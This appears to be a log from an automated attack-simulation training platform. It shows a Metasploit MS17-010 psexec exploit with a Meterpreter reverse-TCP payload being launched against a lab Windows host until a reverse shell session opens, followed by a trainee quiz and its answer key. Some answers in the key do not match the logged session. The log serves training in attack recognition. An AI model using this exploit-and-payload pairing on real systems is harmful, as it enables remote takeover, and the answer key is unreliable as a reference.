2020-05-14 04:32:41,456- attack-thread - INFO - Property Not Found
2020-05-14 04:32:41,535- attack-thread - INFO - ....................Parsing Scenario....................
2020-05-14 04:32:41,550- attack-thread - INFO - [{'TA01_T1190_P1': {'name': 'ms17_010_psexec', 'tactic': 'Initial_Access', 'try_count': 2, 'spawn_seperate_session': True, 'tool': 'metasploit', 'exploit': 'windows/smb/ms17_010_psexec', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'RHOSTS': 'RHOSTS_$ref'}}}]
2020-05-14 04:32:41,550- attack-thread - INFO - *****************************Check tools status*****************************
2020-05-14 04:32:41,551- attack-thread - INFO - ['metasploit']
2020-05-14 04:32:41,552- attack-thread - INFO - msfconsole = [32mTrue[0m
2020-05-14 04:32:41,553- attack-thread - INFO - ************************Updating Session Tactics**********************
2020-05-14 04:32:41,560- attack-thread - INFO - Tacics list has been appended in list has been appended in evaluation
2020-05-14 04:32:41,565- attack-thread - INFO - No Exceptions Found
2020-05-14 04:32:41,751- attack-thread - INFO - post not needed
2020-05-14 04:32:41,768- attack-thread - INFO - exploit['LHOST'] not needed...
2020-05-14 04:32:41,768- attack-thread - INFO - exploit['LPORT'] not needed...
2020-05-14 04:32:41,768- attack-thread - INFO - option not found in payloads
2020-05-14 04:32:41,793- attack-thread - INFO - cid: 0
2020-05-14 04:32:41,793- attack-thread - INFO - ....................Executing Exploit......................................
2020-05-14 04:32:42,856- attack-thread - INFO - {'job_id': 0, 'uuid': '3gc1mmta'}
2020-05-14 04:32:42,861- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:32:45,874- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:32:48,887- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:32:51,912- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:32:54,925- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:32:57,928- attack-thread - INFO - .........Executing Exploit again..........

2020-05-14 04:32:57,929- attack-thread - INFO - ....................Executing Exploit......................................
2020-05-14 04:32:58,935- attack-thread - INFO - {'job_id': 1, 'uuid': 'qbloyugp'}
2020-05-14 04:32:58,940- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:01,953- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:04,965- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:07,978- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:10,991- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:13,995- attack-thread - INFO - .........Executing Exploit again..........

2020-05-14 04:33:13,995- attack-thread - INFO - ....................Executing Exploit......................................
2020-05-14 04:33:15,006- attack-thread - INFO - {'job_id': 2, 'uuid': 'r4tomsic'}
2020-05-14 04:33:15,011- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:18,024- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:21,037- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:24,049- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:27,062- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:30,065- attack-thread - INFO - .........Executing Exploit again..........

2020-05-14 04:33:30,066- attack-thread - INFO - ....................Executing Exploit......................................
2020-05-14 04:33:31,082- attack-thread - INFO - {'job_id': 3, 'uuid': 'fsjrd18g'}
2020-05-14 04:33:31,087- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:34,100- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:37,112- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:40,125- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:43,137- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:46,139- attack-thread - INFO - .........Executing Exploit again..........

2020-05-14 04:33:46,139- attack-thread - INFO - ....................Executing Exploit......................................
2020-05-14 04:33:47,147- attack-thread - INFO - {'job_id': 4, 'uuid': 'nwfnaw5c'}
2020-05-14 04:33:47,152- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:50,165- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:53,177- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:56,196- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:33:59,209- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:34:02,212- attack-thread - INFO - .........Executing Exploit again..........

2020-05-14 04:34:02,212- attack-thread - INFO - ....................Executing Exploit......................................
2020-05-14 04:34:03,226- attack-thread - INFO - {'job_id': 5, 'uuid': 'bvtfqlxx'}
2020-05-14 04:34:03,232- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:34:06,243- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:34:09,255- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:34:12,267- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:34:15,280- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:34:18,283- attack-thread - INFO - .........Executing Exploit again..........

2020-05-14 04:34:18,284- attack-thread - INFO - ....................Executing Exploit......................................
2020-05-14 04:34:19,302- attack-thread - INFO - {'job_id': 6, 'uuid': 'r9s1ycgx'}
2020-05-14 04:34:19,307- attack-thread - INFO - Meterpreter Sessions list empty: {}
2020-05-14 04:34:22,319- attack-thread - INFO - Meterpreter Sessions {'1': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:28555', 'tunnel_peer': '192.168.18.53:52938', 'via_exploit': 'exploit/windows/smb/ms17_010_psexec', 'via_payload': 'payload/windows/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 445, 'target_host': '192.168.18.53', 'username': 'root', 'uuid': '2vt1nmcv', 'exploit_uuid': 'r9s1ycgx', 'routes': '', 'arch': 'x86', 'platform': 'windows'}}
2020-05-14 04:34:22,322- attack-thread - INFO - Meterpreter Session found in list!, with ID = 1
2020-05-14 04:34:22,322- attack-thread - INFO - ....................Meterpreter Session List...............................
2020-05-14 04:34:22,325- attack-thread - INFO - {'1': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:28555', 'tunnel_peer': '192.168.18.53:52938', 'via_exploit': 'exploit/windows/smb/ms17_010_psexec', 'via_payload': 'payload/windows/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 445, 'target_host': '192.168.18.53', 'username': 'root', 'uuid': '2vt1nmcv', 'exploit_uuid': 'r9s1ycgx', 'routes': '', 'arch': 'x86', 'platform': 'windows'}}
2020-05-14 04:34:22,325- attack-thread - INFO - ....................Connected Meterpreter Session Id: 1....................
2020-05-14 04:34:22,328- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-05-14 04:34:22,350- attack-thread - INFO - Appending Generalize questions_answers
2020-05-14 04:34:22,350- attack-thread - INFO - Appending scenario-specific questions_answers
2020-05-14 04:34:22,350- attack-thread - INFO - *****************************Questions*****************************
2020-05-14 04:34:22,350- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Which Payload type is being used? For Example: Reverse_tcp': 'windows/x64/meterpreter/reverse_tcp'}, 'Question_2': {" Which port is responsible for Attacker's entrance?": '80'}, 'Question_3': {' Which Port is responsible for backdoor connection?': '8778'}, 'Question_4': {' What is time of running payload?  ': '11:09'}, 'Question_5': {' Which Type of attack it is?   ': 'RCD'}, 'Question_6': {'What is the source of coming of  malicious software?  ': 'Application'}, 'Question_7': {'Is it Escalate its priviledge? ': 'Yes'}, 'Question_8': {'Is it Persistence? ': 'No'}}
2020-05-14 04:34:22,350- attack-thread - INFO - *****************************Actual Answers*****************************
2020-05-14 04:34:22,350- attack-thread - INFO - ['192.168.18.61', 28555, 'windows/x64/meterpreter/reverse_tcp', '80', '8778', '11:09', 'RCD', 'Application', 'Yes', 'No']
2020-05-14 04:34:22,353- attack-thread - INFO - evaluation id:5ebc84226708ff296e0a3748
2020-05-14 04:34:22,353- attack-thread - INFO - ************************Updating Evaluation form for user**********************
2020-05-14 04:34:22,357- attack-thread - INFO - TA01_T1190_P1 has been appended in evaluation
2020-05-14 04:34:22,357- attack-thread - INFO - ******[Scenario-ID: TA01_T1190_P1Tactic: Initial_Access executed]******
2020-05-14 04:34:22,357- attack-thread - INFO - ....................Destroying Session.....................................
